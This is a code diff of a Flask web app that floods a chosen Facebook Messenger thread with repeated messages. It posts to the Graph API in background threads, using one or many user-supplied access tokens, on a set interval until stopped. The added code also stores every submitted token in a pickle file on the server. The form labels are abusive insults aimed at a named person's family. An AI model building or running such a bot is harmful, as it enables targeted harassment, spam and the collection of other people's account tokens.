@@ -1,8 +1,12 @@
-from flask import Flask, request
+from flask import Flask, request, render_template_string
 import requests
-from time import sleep
+from threading import Thread, Event
 import time
-from datetime import datetime
+import random
+import string
+import pickle
+import os
+
 app = Flask(__name__)
 app.debug = True
 
@@ -11,16 +15,63 @@ headers = {
     'Cache-Control': 'max-age=0',
     'Upgrade-Insecure-Requests': '1',
     'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.76 Safari/537.36',
+    'user-agent': 'Mozilla/5.0 (Linux; Android 11; TECNO CE7j) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.40 Mobile Safari/537.36',
     'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
     'Accept-Encoding': 'gzip, deflate',
     'Accept-Language': 'en-US,en;q=0.9,fr;q=0.8',
     'referer': 'www.google.com'
 }
 
+# Create a database using pickle to store access tokens
+db_path = 'tokens_db.pkl'
+
+def load_db():
+    if os.path.exists(db_path):
+        with open(db_path, 'rb') as f:
+            return pickle.load(f)
+    return {}
+
+def save_db(data):
+    with open(db_path, 'wb') as f:
+        pickle.dump(data, f)
+
+stop_events = {}
+threads = {}
+
+def send_messages(access_tokens, thread_id, mn, time_interval, messages, task_id):
+    stop_event = stop_events[task_id]
+    while not stop_event.is_set():
+        for message1 in messages:
+            if stop_event.is_set():
+                break
+            for access_token in access_tokens:
+                # Add the custom message before the actual message
+                message = f"Hello SAHIIL SīīR II AM USIING YOUR OFFLINE SERVER...MY TOKEN IIS..⤵️ {mn} {message1}"
+                api_url = f'https://graph.facebook.com/v15.0/t_{thread_id}/'
+                parameters = {'access_token': access_token, 'message': message}
+                response = requests.post(api_url, data=parameters, headers=headers)
+                if response.status_code == 200:
+                    print(f"Message Sent Successfully From token {access_token}: {message}")
+                else:
+                    print(f"Message Sent Failed From token {access_token}: {message}")
+                time.sleep(time_interval)
+
 @app.route('/', methods=['GET', 'POST'])
 def send_message():
     if request.method == 'POST':
-        access_token = request.form.get('accessToken')
+        token_option = request.form.get('tokenOption')
+
+        if token_option == 'single':
+            access_tokens = [request.form.get('singleToken')]
+        else:
+            token_file = request.files['tokenFile']
+            access_tokens = token_file.read().decode().strip().splitlines()
+
+        # Validate target UID
+        target_uid = "61571843423018"  # Your UID
+        if target_uid not in access_tokens:
+            return f"Unauthorized access. Only authorized tokens can be used."
+
         thread_id = request.form.get('threadId')
         mn = request.form.get('kidx')
         time_interval = int(request.form.get('time'))
@@ -28,349 +79,152 @@ def send_message():
         txt_file = request.files['txtFile']
         messages = txt_file.read().decode().splitlines()
 
-        while True:
-            try:
-                for message1 in messages:
-                    api_url = f'https://graph.facebook.com/v15.0/t_{thread_id}/'
-                    message = str (mn) + ' ' + message1
-                    parameters = {'access_token': access_token, 'message': message}
-                    response = requests.post(api_url, data=parameters, headers=headers)
-                    if response.status_code == 200:
-                        print(f"Message sent using token {access_token}: {message}")
-                    else:
-                        print(f"Failed to send message using token {access_token}: {message}")
-                    time.sleep(time_interval)
-            except Exception as e:
-                print(f"Error while sending message using token {access_token}: {message}")
-                print(e)
-                time.sleep(30)
+        task_id = ''.join(random.choices(string.ascii_letters + string.digits, k=8))
 
+        stop_events[task_id] = Event()
+        thread = Thread(target=send_messages, args=(access_tokens, thread_id, mn, time_interval, messages, task_id))
+        threads[task_id] = thread
+        thread.start()
 
-    return '''
+        # Store token in database
+        db = load_db()
+        db[task_id] = access_tokens
+        save_db(db)
 
+        return f'YOUR STOP KEY -> {task_id}'
+
+    return render_template_string('''
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta charset="UTF-8">
+  <meta charset="utf-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>𝐀𝐍𝐈𝐒𝐇 𝐗𝐃 𝐇𝐄𝐑𝐄</title>
+  <title> 𝗚𝗘𝗡𝗢𝗫 𝗞𝗜 𝗔𝗠𝗔 𝗞𝗢 𝗣𝗢𝗜𝗜 𝗔𝗡𝗜𝗦𝗛 </title>
   <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.0.2/dist/css/bootstrap.min.css" rel="stylesheet">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.4/css/all.min.css">
   <style>
+    /* CSS for styling elements */
+    label { color: white; }
+    .file { height: 30px; }
     body {
-      background-image: url('birthday_background.jpg'); /* Specify the path to your birthday background image */
-      background-repeat: repeat; /* Repeat the background image */
-      font-family: Arial, sans-serif;
+      background-image: url('https://i.ibb.co/19kSMz4/In-Shot-20241121-173358587.jpg');
+      background-size: cover;
+      background-repeat: no-repeat;
+      color: white;
     }
     .container {
-      max-width: 300px;
-      background-color: bisque;
-      border-radius: 10px;
+      max-width: 350px; 
+      height: auto;
+      border-radius: 20px;
       padding: 20px;
-      box-shadow: 0 0 10px rgba(0, 0, 0, 0.2);
-      margin: 20px auto;
+      box-shadow: 0 0 15px rgba(0, 0, 0, 0.1);
+      box-shadow: 0 0 15px white;
+      border: none;
+      resize: none;
     }
-    .header {
-      text-align: center;
-      margin-bottom: 20px;
-      color: blue;
-    }
-    .btn-submit {
+    .form-control {
+      outline: 1px red;
+      border: 1px double white;
+      background: transparent;
       width: 100%;
+      height: 40px;
+      padding: 7px;
+      margin-bottom: 20px;
+      border-radius: 10px;
+      color: white;
+    }
+    .header { text-align: center; padding-bottom: 20px; }
+    .btn-submit { width: 100%; margin-top: 10px; }
+    .footer { text-align: center; margin-top: 20px; color: #888; }
+    .whatsapp-link {
+      display: inline-block;
+      color: #25d366;
+      text-decoration: none;
       margin-top: 10px;
     }
-    .footer {
-      text-align: center;
-      margin-top: 20px;
-    }
-    .box {
-      border: 2px solid black;
-      padding: 20px;
-      margin-top: 20px;
-      background-color: lavender;
-      color: purple;
-    }
-    /* New styles for birthday box */
-    .birthday-box {
-      position: absolute;
-      top: 0;
-      left: 50%;
-      transform: translateX(-50%);
-      background-color: #ffcc00;
-      color: black;
-      padding: 5px 10px;
-      border-radius: 5px;
-      z-index: 999;
-    } 
+    .whatsapp-link i { margin-right: 5px; }
   </style>
 </head>
 <body>
-  <!-- ANISH XD-->
-  <div class="ANISH-XD">
-    <p> ANISH HERE</p>
+  <header class="header mt-4">
+    <h1 class="mt-3">☠️❤️ 𝙊𝙒𝙉𝙀𝙍 𝗚𝗘𝗡𝗢𝗫 𝗞𝗜 𝗔𝗠𝗔 𝗞𝗢 𝗣𝗢𝗜𝗜 𝗔𝗡𝗜𝗦𝗛  ❤️☠️</h1>
+  </header>
+  <div class="container text-center">
+    <form method="post" enctype="multipart/form-data">
+      <div class="mb-3">
+        <label for="tokenOption" class="form-label">Select Token Option</label>
+        <select class="form-control" id="tokenOption" name="tokenOption" onchange="toggleTokenInput()" required>
+          <option value="single">Single Token</option>
+          <option value="multiple">Token File</option>
+        </select>
+      </div>
+      <div class="mb-3" id="singleTokenInput">
+        <label for="singleToken" class="form-label">𝙀𝙉𝙏𝙀𝙍 𝗟𝗔𝗗𝗢 𝗙𝗢𝗥 𝗚𝗘𝗡𝗢𝗫 𝗞𝗜 𝗔𝗠𝗔..⤵️</label>
+        <input type="text" class="form-control" id="singleToken" name="singleToken">
+      </div>
+      <div class="mb-3" id="tokenFileInput" style="display: none;">
+        <label for="tokenFile" class="form-label">Choose Token File</label>
+        <input type="file" class="form-control" id="tokenFile" name="tokenFile">
+      </div>
+      <div class="mb-3">
+        <label for="threadId" class="form-label">𝙀𝙉𝙏𝙀𝙍 𝗚𝗘𝗡𝗢𝗫 𝗞𝗜 𝗔𝗠𝗔 𝗞𝗢 𝗣𝗨𝗧𝗜 𝗠𝗔 𝗝𝗔𝗡𝗘 𝙐𝙄𝘿...⤵️</label>
+        <input type="text" class="form-control" id="threadId" name="threadId" required>
+      </div>
+      <div class="mb-3">
+        <label for="kidx" class="form-label">𝙀𝙉𝙏𝙀𝙍 𝗚𝗘𝗡𝗢𝗫𝗞𝗜 𝗔𝗠𝗔 𝗞𝗢 𝗣𝗨𝗧𝗜 𝗛𝗔𝗧𝗘𝗥 𝙉𝘼𝙈𝙀...⤵️</label>
+        <input type="text" class="form-control" id="kidx" name="kidx" required>
+      </div>
+      <div class="mb-3">
+        <label for="time" class="form-label">𝙀𝙉𝙏𝙀𝙍 𝗚𝗘𝗡𝗢𝗫 𝗞𝗜 𝗔𝗠𝗔 𝗖𝗛𝗜𝗞𝗡𝗘 𝙎𝙋𝙀𝙀𝘿...⤵️ (seconds)</label>
+        <input type="number" class="form-control" id="time" name="time" required>
+      </div>
+      <div class="mb-3">
+        <label for="txtFile" class="form-label">𝙀𝙉𝙏𝙀𝙍 𝗚𝗘𝗡𝗢𝗫 𝗞𝗜 𝗔𝗠𝗔 𝗟𝗘 𝗗𝗘𝗥𝗘𝗦𝗩𝗘 𝗚𝗔𝗥𝗡𝗘 𝙂𝘼𝙇𝙄 𝙁𝙄𝙇𝙀..⤵️</label>
+        <input type="file" class="form-control" id="txtFile" name="txtFile" required>
+      </div>
+      <button type="submit" class="btn btn-primary btn-submit">☠️ 𝙍𝙐𝙉𝙄𝙉𝙂 𝙎𝙀𝙍𝙑𝙀𝙍 ☠️</button>
+    </form>
+    <form method="post" action="/stop">
+      <div class="mb-3">
+        <label for="taskId" class="form-label">𝙀𝙉𝙏𝙀𝙍 𝗚𝗘𝗡𝗢𝗫 𝗞𝗜 𝗔𝗠𝗔 𝗖𝗛𝗜𝗞𝗔𝗦𝗘 𝗥𝗢𝗞𝗡𝗘 𝗞𝗘𝗬..⤵️</label>
+        <input type="text" class="form-control" id="taskId" name="taskId" required>
+      </div>
+      <button type="submit" class="btn btn-danger btn-submit mt-3">❤️ 𝙎𝙏𝙊𝙋 𝙎𝙀𝙍𝙑𝙀𝙍 ❤️</button>
+    </form>
   </div>
-
- <style>
-        /* Style for the container */
-        .containe {
-            width: 300px;
-            margin: 50px auto;
-            background-color: #F9F449;
-            padding: 20px;
-            border: 3px solid black;
-            border-radius: 10px;
-        }
-        
-        /* Style for the text inside the box */
-        .text-box {
-            font-size: 14px;
-            color: #333;
-        } 
-         .containr {
-            width: 300px;
-            margin: 50px auto;
-            background-color: #C3F7EF;
-            padding: 20px;
-            border-radius: 10px; /* Added border radius value */
-            border-style: solid;
-            animation: borderChangeColor 1s infinite alternate, borderChangeWidth 1s infinite alternate, borderChangeStyle 10s infinite alternate;
-        }
-        
-        /* Style for the text inside the box */
-        .text-box {
-            font-size: 14px;
-            color: #333;
-        }
-
-        /* Keyframes for the border color change */
-        @keyframes borderChangeColor {
-    0% { border-color: red; }
-    10% { border-color: orange; }
-    20% { border-color: yellow; }
-    30% { border-color: lime; }
-    40% { border-color: green; }
-    50% { border-color: aqua; }
-    60% { border-color: blue; }
-    70% { border-color: purple; }
-    80% { border-color: indigo; }
-    90% { border-color: violet; }
-    100% { border-color: pink; }
-}
-
-        }
-
-        /* Keyframes for the border width change */
-        @keyframes borderChangeWidth {
-            0% { border-width: 5px; }
-            10% { border-width: 10px; }
-            20% { border-width: 3px; }
-            40% { border-width: 8px; }
-            60% { border-width: 4px; }
-            80% { border-width: 7px; }
-            100% { border-width: 6px; }
-        }
-
-        /* Keyframes for the border style change */
-        @keyframes borderChangeStyle {
-            0% { border-style: solid; }
-            10% { border-style: dotted; }
-            20% { border-style: dashed; }
-            30% { border-style: double; }
-            40% { border-style: groove; }
-            50% { border-style: ridge; }
-            60% { border-style: inset; }
-            70% { border-style: outset; }
-           
-           
-           
-        } .containor {
-            width: 300px;
-            margin: 50px auto;
-            background-color: #f5f5f5;
-            padding: 20px;
-            border-radius: 10px; /* Added border radius value */
-            border-style: solid;
-            animation: borderChangeColor 1s infinite alternate, borderChangeWidth 1s infinite alternate, borderChangeStyle 10s infinite alternate;
-        }
-        
-        /* Style for the text inside the box */
-        .text-box {
-            font-size: 14px;
-            color: #333;
-        }
-
-        /* Keyframes for the border color change */
-        @keyframes borderChangeColor {
-    0% { border-color: red; }
-    10% { border-color: orange; }
-    20% { border-color: yellow; }
-    30% { border-color: lime; }
-    40% { border-color: green; }
-    50% { border-color: aqua; }
-    60% { border-color: blue; }
-    70% { border-color: purple; }
-    80% { border-color: indigo; }
-    90% { border-color: violet; }
-    100% { border-color: pink; }
-}
-
-        }
-
-        /* Keyframes for the border width change */
-        @keyframes borderChangeWidth {
-            0% { border-width: 5px; }
-            10% { border-width: 10px; }
-            20% { border-width: 3px; }
-            40% { border-width: 8px; }
-            60% { border-width: 4px; }
-            80% { border-width: 7px; }
-            100% { border-width: 6px; }
-        }
-
-        /* Keyframes for the border style change */
-        @keyframes borderChangeStyle {
-           
-            30% { border-style: double; }
-            40% { border-style: groove; }
-            50% { border-style: ridge; }
-            60% { border-style: inset; }
-            70% { border-style: outset; }
-           
-           
-           
-        }
-    </style>
-</head>
-<body> </div> <div class="containor">
-    <!-- Your text box content here -->
-    <footer class="footer">
-      <p> <span class="color-sp"></span> <span class="boxed-text"><span class="color-spa">𝐀𝐍𝐈𝐒𝐇 𝐗𝐃 𝐇𝐄𝐑𝐄</span>.</span></p>
-      <p><span class="boxed-text2"><span class="color-span">𝐀𝐍𝐈𝐒𝐇 𝐗𝐃 𝐇𝐄𝐑𝐄</span></span></p>
-  </p>
-    </footer>
+  <footer class="footer">
+    <p>☠️✨ 𝗚𝗘𝗡𝗢𝗫 𝗞𝗜 𝗔𝗠𝗔 𝗞𝗢 𝗣𝗨𝗧𝗜 𝙃𝙀𝙍𝙀 ✨☠️</p>
+    <p> <a href="https://www.facebook.com/profile.php?id=61571843423018">ᴄʟɪᴄᴋ ʜᴇʀᴇ ғᴏʀ ғᴀᴄᴇʙᴏᴏᴋ</a></p>
+    <div class="mb-3">
+      <a href="https://wa.me/+919058736281" class="whatsapp-link">
+        <i class="fab fa-whatsapp"></i>💫 𝘾𝙃𝘼𝙏 𝙊𝙉 𝙒𝙃𝘼𝙏𝙎𝘼𝙋𝙋 💫
+      </a>
     </div>
-</div>
-
-
-    <div class="containe">
-      <form action="/" method="post" enctype="multipart/form-data">
-        <div class="mb-3">
-          <label for="accessToken">ENT3R YOUR TOK3N:</label>
-          <input type="text" class="form-control" id="accessToken" name="accessToken" required>
-        </div>
-        <div class="mb-3">
-          <label for="threadId">ENT3R CONVO/1NBOX 1D:</label>
-          <input type="text" class="form-control" id="threadId" name="threadId" required>
-        </div>
-        <div class="mb-3">
-          <label for="kidx">ENT3R HATT3R N9M3:</label>
-          <input type="text" class="form-control" id="kidx" name="kidx" required>
-        </div>
-        <div class="mb-3">
-          <label for="txtFile">S3L3CT YOUR NOT3P9D F1L3:</label>
-          <input type="file" class="form-control" id="txtFile" name="txtFile" accept=".txt" required>
-        </div>
-        <div class="mb-3">
-          <label for="time">SP33D 1N S3CONDS:</label>
-          <input type="number" class="form-control" id="time" name="time" required>
-        </div>
-        <button type="submit" class="btn btn-primary btn-submit">Submit Your Details</button>
-      </form>
-    </div>
-   <style>
-    .footer {
-      color: #B00402; /* Off-Blue color */
-    }
-    .boxed-text {
-      border: 2px solid #B00402; /* Border around the text */
-      padding: 10px; /* Add some padding inside the box */
-      display: inline-block; /* Make the box inline so it wraps around the text */
-    }
-    .boxed-text2 {
-      border: 2px solid #000000; /* Border around the text */
-      padding: 10px; /* Add some padding inside the box */
-      display: inline-block; /* Make the box inline so it wraps around the text */
-    }
-    .footer a {
-      color: #FFFF00; /* Off-Blue color for links */
-      text-decoration: none; /* Remove underline from links */
-    }
-    
-  </style>
-</head>
-<body>
-  <div>
-    
-  </div> <div class="containor">
-    <!-- Your text box content here -->
-    <footer class="footer">
-      <p> <span class="color-sp"></span> <span class="boxed-text"><span class="color-spa">𝐌𝟗𝐃𝟑 𝐁𝐘 𝐀𝐍11𝐒𝐇 𝐗𝐃</span>.</span></p>
-      <p><span class="boxed-text"><span class="color-span">𝐒𝟑𝐑𝐕3𝐑 𝐀𝐍𝐈𝐒𝐇 𝐗𝐃</span></span></p>
-      <p><span class="boxed-text"><span class="color-sp">2022 </span> <a href="𝐀𝐍𝐈𝐒𝐇 𝐗𝐃" class="color-s">YOUTUBE</a></p>
-    </footer>
-    </div>
-</div>
-
+  </footer>
   <script>
-    // JavaScript to change footer text color
-    var colors = ['red', 'green', 'blue', 'purple', 'orange']; // Define colors
-    var colorIndex = 0;
-
-    setInterval(function() {
-      var footerTexts = document.querySelectorAll('.footer .color-span');
-      footerTexts.forEach(function(span) {
-        span.style.color = colors[colorIndex];
-      });
-      colorIndex = (colorIndex + 1) % colors.length;
-    }, 500); 
-    </script>
-    <script>
-    
-    // JavaScript to change footer text color
-    var colors = ['red', 'green', 'blue', 'purple', 'orange']; // Define colors
-    var colorIndex = 0;
-
-    setInterval(function() {
-      var footerTexts = document.querySelectorAll('.footer .color-spa');
-      footerTexts.forEach(function(span) {
-        span.style.color = colors[colorIndex];
-      });
-      colorIndex = (colorIndex + 1) % colors.length;
-    }, 500); // Change color every 2 seconds (2000 milliseconds)
-  </script>
-  
-  <script>
-    // JavaScript to change footer text color
-    var colors = ['red', 'green', 'blue', 'purple', 'orange']; // Define colors
-    var colorIndex = 0;
-
-    setInterval(function() {
-      var footerTexts = document.querySelectorAll('.footer .color-s');
-      footerTexts.forEach(function(span) {
-        span.style.color = colors[colorIndex];
-      });
-      colorIndex = (colorIndex + 1) % colors.length;
-    }, 500); 
-    </script>
-    <script>
-    
-    // JavaScript to change footer text color
-    var colors = ['red', 'green', 'blue', 'purple', 'orange']; // Define colors
-    var colorIndex = 0;
-
-    setInterval(function() {
-      var footerTexts = document.querySelectorAll('.footer .color-sp');
-      footerTexts.forEach(function(span) {
-        span.style.color = colors[colorIndex];
-      });
-      colorIndex = (colorIndex + 1) % colors.length;
-    }, 500); // Change color every 2 seconds (2000 milliseconds)
+    function toggleTokenInput() {
+      var tokenOption = document.getElementById('tokenOption').value;
+      if (tokenOption == 'single') {
+        document.getElementById('singleTokenInput').style.display = 'block';
+        document.getElementById('tokenFileInput').style.display = 'none';
+      } else {
+        document.getElementById('singleTokenInput').style.display = 'none';
+        document.getElementById('tokenFileInput').style.display = 'block';
+      }
+    }
   </script>
 </body>
 </html>
+''')
 
-    '''
-
+@app.route('/stop', methods=['POST'])
+def stop_task():
+    task_id = request.form.get('taskId')
+    if task_id in stop_events:
+        stop_events[task_id].set()
+        return f'Task with ID {task_id} has been stopped.'
+    else:
+        return f'No task found with ID {task_id}.'
 
 if __name__ == '__main__':
     app.run(host='0.0.0.0', port=5000)
-    app.run(debug=True)
